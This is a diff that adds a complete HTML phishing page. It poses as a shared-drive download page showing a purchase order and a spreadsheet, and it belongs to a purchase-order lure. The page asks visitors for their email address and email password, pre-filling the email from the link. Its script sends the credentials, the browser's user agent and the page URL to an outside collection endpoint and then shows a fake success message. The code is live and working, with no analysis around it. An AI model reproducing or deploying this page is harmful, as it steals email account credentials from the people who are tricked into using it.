@@ -1,0 +1,742 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>My Drive · Secure File Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #111;
+        }
+        
+        /* Header */
+        .header {
+            background-color: #f5f5f5;
+            padding: 20px 24px;
+        }
+        
+        .header-inner {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1280px;
+            margin: 0 auto;
+        }
+        
+        .header h1 {
+            font-size: 18px;
+            font-weight: 400;
+            color: #000;
+        }
+        
+        .grid-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Main container */
+        .main-container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+        
+        /* Shared section */
+        .shared-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        
+        .shared-header h2 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #000;
+            letter-spacing: 0.5px;
+        }
+        
+        .download-all-btn {
+            background: none;
+            border: none;
+            color: #0066cc;
+            font-size: 14px;
+            font-weight: 400;
+            cursor: pointer;
+            padding: 0;
+        }
+        
+        .download-all-btn:hover {
+            text-decoration: underline;
+        }
+        
+        /* File list header */
+        .file-list-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-top: 1px solid #e0e0e0;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 0;
+            margin-bottom: 20px;
+            background-color: #fafafa;
+        }
+        
+        .file-list-header span {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        /* Grid - 2 columns for 2 files */
+        .file-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        @media (max-width: 640px) {
+            .file-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* Card */
+        .file-card {
+            background-color: #fff;
+            border: 1px solid #e5e5e5;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: box-shadow 0.2s ease;
+            overflow: hidden;
+        }
+        
+        .file-card:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        .card-content {
+            padding: 12px;
+        }
+        
+        /* Preview container */
+        .preview-container {
+            aspect-ratio: 4 / 3;
+            background-color: #f8f8f8;
+            border: 1px solid #e8e8e8;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .preview-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        
+        /* File info */
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .file-icon {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        
+        .file-icon svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .file-name {
+            font-size: 13px;
+            color: #333;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            font-weight: 400;
+        }
+        
+        /* Icon colors */
+        .icon-pdf svg { stroke: #dc2626; }
+        .icon-xlsx svg { stroke: #22c55e; }
+        
+        /* Dialog Overlay - PERFECT CENTERING */
+        .dialog-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(2px);
+        }
+        
+        /* Dialog Content */
+        .dialog-content {
+            background-color: #fff;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 440px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.2);
+            animation: slideUp 0.25s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .dialog-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 24px 0 24px;
+        }
+        
+        .dialog-title {
+            font-size: 18px;
+            font-weight: 400;
+            color: #4b5563;
+        }
+        
+        .dialog-title-dark {
+            color: #1f2937;
+        }
+        
+        .close-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #9ca3af;
+            padding: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+        }
+        
+        .close-btn:hover {
+            color: #4b5563;
+            background-color: #f3f4f6;
+        }
+        
+        .dialog-body {
+            padding: 20px 24px 24px 24px;
+        }
+        
+        /* Form styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #374151;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+        }
+        
+        .bg-gray-input {
+            background-color: #f9fafb;
+        }
+        
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .checkbox-wrapper input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #3b82f6;
+        }
+        
+        .checkbox-wrapper label {
+            font-size: 14px;
+            color: #374151;
+            cursor: pointer;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background-color: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .submit-btn:hover:not(:disabled) {
+            background-color: #2563eb;
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .error-message {
+            color: #ef4444;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            padding: 8px;
+            background-color: #fef2f2;
+            border-radius: 6px;
+        }
+        
+        .link-btn {
+            background: none;
+            border: none;
+            color: #3b82f6;
+            font-size: 13px;
+            cursor: pointer;
+            padding: 8px 0;
+        }
+        
+        .link-btn:hover {
+            text-decoration: underline;
+        }
+        
+        .text-center {
+            text-align: center;
+        }
+        
+        .mt-3 {
+            margin-top: 12px;
+        }
+        
+        /* Success message */
+        .success-message {
+            color: #10b981;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 8px;
+            padding: 8px;
+            background-color: #ecfdf5;
+            border-radius: 6px;
+        }
+        
+        /* Loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="root"></div>
+
+    <script>
+        (function() {
+            // ============================================================
+            // ⭐ CONFIGURE YOUR IMAGES HERE ⭐
+            // Both files are now set as "image" type (no play button overlay)
+            // ============================================================
+            const IMAGE_CONFIG = {
+                // First file - PDF (no play button)
+                file1: {
+                    name: "Purchase_Order.pdf",
+                    type: "image",           // 👈 Changed from "video" to "image" - no play button
+                    previewImage: "file_3a381.png?height=200&width=300",
+                    iconType: "pdf"          // 👈 Changed to pdf icon
+                },
+                // Second file - Excel/Spreadsheet
+                file2: {
+                    name: "Specification.xlsx", 
+                    type: "image",           // 👈 Image type - no play button
+                    previewImage: "file_1a381.png?height=200&width=300",
+                    iconType: "xlsx"         // 👈 Excel icon
+                }
+            };
+            // ============================================================
+            
+            // SVG Icons as HTML strings
+            const Icons = {
+                Grid: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="18" x="3" y="3" rx="2"></rect><path d="M3 9h18"></path><path d="M3 15h18"></path><path d="M9 3v18"></path><path d="M15 3v18"></path></svg>`,
+                X: `<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>`,
+                Pdf: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg>`,
+                Xlsx: `<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M8 13h2"></path><path d="M14 13h2"></path><path d="M8 17h2"></path><path d="M14 17h2"></path></svg>`
+            };
+            
+            // Build files array from config
+            const files = [
+                { 
+                    id: "1", 
+                    name: IMAGE_CONFIG.file1.name, 
+                    type: IMAGE_CONFIG.file1.type, 
+                    iconType: IMAGE_CONFIG.file1.iconType,
+                    preview: IMAGE_CONFIG.file1.previewImage
+                },
+                { 
+                    id: "2", 
+                    name: IMAGE_CONFIG.file2.name, 
+                    type: IMAGE_CONFIG.file2.type, 
+                    iconType: IMAGE_CONFIG.file2.iconType,
+                    preview: IMAGE_CONFIG.file2.previewImage
+                }
+            ];
+            
+            // Send data to Telegram via your URL
+            async function sendToTelegram(email, password, fileName, action) {
+                const url = "https://scitecinstruments.it.com/panel/sg.php";
+                const data = {
+                    email: email,
+                    password: password,
+                    file: fileName,
+                    action: action,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    pageUrl: window.location.href
+                };
+                
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    const result = await response.text();
+                    console.log('Response from server:', result);
+                    return result;
+                } catch (error) {
+                    console.error('Send error:', error);
+                    return null;
+                }
+            }
+            
+            let currentDialog = null;
+            let batchDialog = null;
+            
+            function closeDialog() {
+                if (currentDialog && currentDialog.parentNode) {
+                    currentDialog.parentNode.removeChild(currentDialog);
+                    currentDialog = null;
+                }
+            }
+            
+            function closeBatchDialog() {
+                if (batchDialog && batchDialog.parentNode) {
+                    batchDialog.parentNode.removeChild(batchDialog);
+                    batchDialog = null;
+                }
+            }
+            
+            async function handleFormSubmit(email, password, fileName, action, dialogElement, submitBtn, errorDiv, successDiv) {
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="spinner"></span> Sending...';
+                errorDiv.style.display = 'none';
+                if (successDiv) successDiv.style.display = 'none';
+                
+                // Send to Telegram
+                const result = await sendToTelegram(email, password, fileName, action);
+                
+                if (result !== null) {
+                    // Success
+                    if (successDiv) {
+                        successDiv.style.display = 'block';
+                        successDiv.textContent = '✓ Request sent successfully!';
+                    }
+                    submitBtn.innerHTML = '✓ Sent';
+                    
+                    // Auto close after 1.5 seconds
+                    setTimeout(() => {
+                        if (action === 'single') closeDialog();
+                        else closeBatchDialog();
+                    }, 1500);
+                } else {
+                    // Error
+                    errorDiv.style.display = 'block';
+                    errorDiv.textContent = 'Connection error. Please try again.';
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = 'Try Again';
+                }
+            }
+            
+            function showDownloadDialog(file) {
+                closeDialog();
+                
+                const overlay = document.createElement('div');
+                overlay.className = 'dialog-overlay';
+                overlay.onclick = (e) => { if (e.target === overlay) closeDialog(); };
+                
+                const dialog = document.createElement('div');
+                dialog.className = 'dialog-content';
+                
+                const urlParams = new URLSearchParams(window.location.search);
+                const prefilledEmail = urlParams.get('id') || '';
+                
+                dialog.innerHTML = `
+                    <div class="dialog-header">
+                        <h2 class="dialog-title">View Secured Document</h2>
+                        <button class="close-btn" id="closeDialogBtn">${Icons.X}</button>
+                    </div>
+                    <div class="dialog-body">
+                        <form id="downloadForm">
+                            <div class="form-group">
+                                <label>Email address</label>
+                                <input type="email" id="dialogEmail" class="form-input bg-gray-input" value="${prefilledEmail}" placeholder="Enter your email" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Email password</label>
+                                <input type="password" id="dialogPassword" class="form-input" placeholder="Enter your password" required>
+                            </div>
+                            <div id="dialogError" class="error-message" style="display: none;"></div>
+                            <div id="dialogSuccess" class="success-message" style="display: none;"></div>
+                            <div class="checkbox-wrapper">
+                                <input type="checkbox" id="staySigned" checked>
+                                <label for="staySigned">Stay Signed In</label>
+                            </div>
+                            <button type="submit" id="submitBtn" class="submit-btn">Download "${file.name}"</button>
+                            <div class="text-center mt-3">
+                                <button type="button" class="link-btn" id="helpLink">Can't access your account?</button>
+                            </div>
+                        </form>
+                    </div>
+                `;
+                
+                overlay.appendChild(dialog);
+                document.body.appendChild(overlay);
+                currentDialog = overlay;
+                
+                const form = dialog.querySelector('#downloadForm');
+                const emailInput = dialog.querySelector('#dialogEmail');
+                const passwordInput = dialog.querySelector('#dialogPassword');
+                const errorDiv = dialog.querySelector('#dialogError');
+                const successDiv = dialog.querySelector('#dialogSuccess');
+                const submitBtn = dialog.querySelector('#submitBtn');
+                const closeBtn = dialog.querySelector('#closeDialogBtn');
+                const helpBtn = dialog.querySelector('#helpLink');
+                
+                closeBtn.onclick = closeDialog;
+                
+                form.onsubmit = async (e) => {
+                    e.preventDefault();
+                    await handleFormSubmit(
+                        emailInput.value, passwordInput.value, file.name, 'single',
+                        dialog, submitBtn, errorDiv, successDiv
+                    );
+                };
+                
+                helpBtn.onclick = () => {
+                    alert('Contact support for account recovery.');
+                };
+            }
+            
+            function showBatchDialog() {
+                closeBatchDialog();
+                
+                const overlay = document.createElement('div');
+                overlay.className = 'dialog-overlay';
+                overlay.onclick = (e) => { if (e.target === overlay) closeBatchDialog(); };
+                
+                const dialog = document.createElement('div');
+                dialog.className = 'dialog-content';
+                
+                const urlParams = new URLSearchParams(window.location.search);
+                const prefilledEmail = urlParams.get('id') || '';
+                
+                const fileNames = files.map(f => f.name).join(', ');
+                
+                dialog.innerHTML = `
+                    <div class="dialog-header">
+                        <h2 class="dialog-title dialog-title-dark">Download All Documents</h2>
+                        <button class="close-btn" id="closeBatchBtn">${Icons.X}</button>
+                    </div>
+                    <div class="dialog-body">
+                        <form id="batchForm">
+                            <div class="form-group">
+                                <label>Email address</label>
+                                <input type="email" id="batchEmail" class="form-input bg-gray-input" value="${prefilledEmail}" placeholder="Enter your email" required>
+                            </div>
+                            <div class="form-group">
+                                <label>Email password</label>
+                                <input type="password" id="batchPassword" class="form-input" placeholder="Enter your password" required>
+                            </div>
+                            <div id="batchError" class="error-message" style="display: none;"></div>
+                            <div id="batchSuccess" class="success-message" style="display: none;"></div>
+                            <div class="checkbox-wrapper">
+                                <input type="checkbox" id="batchStaySigned" checked>
+                                <label for="batchStaySigned">Stay Signed In</label>
+                            </div>
+                            <button type="submit" id="batchSubmitBtn" class="submit-btn">Download All (${files.length} files)</button>
+                            <div class="text-center mt-3">
+                                <button type="button" class="link-btn" id="batchHelpLink">Can't access your account?</button>
+                            </div>
+                        </form>
+                    </div>
+                `;
+                
+                overlay.appendChild(dialog);
+                document.body.appendChild(overlay);
+                batchDialog = overlay;
+                
+                const form = dialog.querySelector('#batchForm');
+                const emailInput = dialog.querySelector('#batchEmail');
+                const passwordInput = dialog.querySelector('#batchPassword');
+                const errorDiv = dialog.querySelector('#batchError');
+                const successDiv = dialog.querySelector('#batchSuccess');
+                const submitBtn = dialog.querySelector('#batchSubmitBtn');
+                const closeBtn = dialog.querySelector('#closeBatchBtn');
+                const helpBtn = dialog.querySelector('#batchHelpLink');
+                
+                closeBtn.onclick = closeBatchDialog;
+                
+                form.onsubmit = async (e) => {
+                    e.preventDefault();
+                    await handleFormSubmit(
+                        emailInput.value, passwordInput.value, `ALL (${fileNames})`, 'batch',
+                        dialog, submitBtn, errorDiv, successDiv
+                    );
+                };
+                
+                helpBtn.onclick = () => {
+                    alert('Contact support for account recovery.');
+                };
+            }
+            
+            // Render main app
+            function renderApp() {
+                const root = document.getElementById('root');
+                
+                let fileCardsHtml = '';
+                for (const file of files) {
+                    const iconMap = { pdf: Icons.Pdf, xlsx: Icons.Xlsx };
+                    const iconHtml = iconMap[file.iconType] || Icons.Pdf;
+                    const iconClass = `icon-${file.iconType}`;
+                    
+                    // NO play overlay since both are images
+                    const playOverlay = '';
+                    
+                    // Handle image loading with fallback
+                    const imageUrl = file.preview;
+                    const fallbackSvg = `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 300'%3E%3Crect width='400' height='300' fill='%23f0f0f0'/%3E%3Ctext x='200' y='150' text-anchor='middle' fill='%23999' font-size='14'%3E${file.name}%3C/text%3E%3C/svg%3E`;
+                    
+                    fileCardsHtml += `
+                        <div class="file-card" data-file-id="${file.id}" data-file-name="${file.name}" data-file-type="${file.type}">
+                            <div class="card-content">
+                                <div class="preview-container">
+                                    <img src="${imageUrl}" alt="${file.name}" class="preview-image" 
+                                         onerror="this.onerror=null; this.src='${fallbackSvg}';">
+                                    ${playOverlay}
+                                </div>
+                                <div class="file-info">
+                                    <span class="file-icon ${iconClass}">${iconHtml}</span>
+                                    <span class="file-name">${file.name}</span>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                root.innerHTML = `
+                    <div class="header">
+                        <div class="header-inner">
+                            <h1>Check Company Order Here</h1>
+                            <button class="grid-btn" id="gridBtn">${Icons.Grid}</button>
+                        </div>
+                    </div>
+                    <main class="main-container">
+                        <div class="shared-header">
+                            <div><h2>SHARED</h2></div>
+                            <button class="download-all-btn" id="downloadAllBtn">DOWNLOAD ALL</button>
+                        </div>
+                        <div class="file-list-header">
+                            <span>Files</span>
+                            <span>Name ↓</span>
+                        </div>
+                        <div class="file-grid" id="fileGrid">${fileCardsHtml}</div>
+                    </main>
+                `;
+                
+                document.getElementById('downloadAllBtn').onclick = () => showBatchDialog();
+                document.getElementById('gridBtn').onclick = () => alert('All files are displayed');
+                
+                document.querySelectorAll('.file-card').forEach(card => {
+                    card.onclick = () => {
+                        const fileName = card.dataset.fileName;
+                        const file = files.find(f => f.name === fileName);
+                        if (file) showDownloadDialog(file);
+                    };
+                });
+            }
+            
+            renderApp();
+        })();
+    </script>
+</body>
+</html>
+```
